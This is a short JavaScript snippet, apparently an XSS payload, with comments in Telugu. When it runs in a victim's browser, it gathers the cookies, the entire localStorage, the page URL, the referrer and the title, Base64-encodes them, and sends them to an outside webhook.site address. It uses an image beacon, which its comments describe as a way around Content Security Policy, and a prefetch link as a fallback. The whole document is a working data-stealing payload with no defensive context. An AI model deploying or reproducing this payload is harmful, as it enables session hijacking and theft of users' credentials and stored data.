(function() {
    // నీ వెబ్‌హుక్ లింక్
    var webhook = "https://73764c17-b242-4f2a-84ba-88f63958a3e1.webhook.site/";

    // డేటాను సేకరించడం
    var info = {
        cookies: document.cookie || "No Cookies Found",
        localStorage: JSON.stringify(localStorage),
        url: window.location.href,
        referrer: document.referrer,
        title: document.title
    };

    // డేటాను Base64 లోకి మార్చడం (సెక్యూరిటీ కోసం)
    var encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(info))));

    // Image ట్యాగ్ ద్వారా డేటా పంపడం (CSP Bypass)
    var log = new Image();
    log.src = webhook + "?report=" + encodedData;

    // రెండవ పద్ధతి: ఒకవేళ ఇమేజ్ బ్లాక్ అయితే లింక్ ద్వారా
    var link = document.createElement('link');
    link.rel = 'prefetch';
    link.href = webhook + "?backup=" + encodedData;
    document.head.appendChild(link);
})();
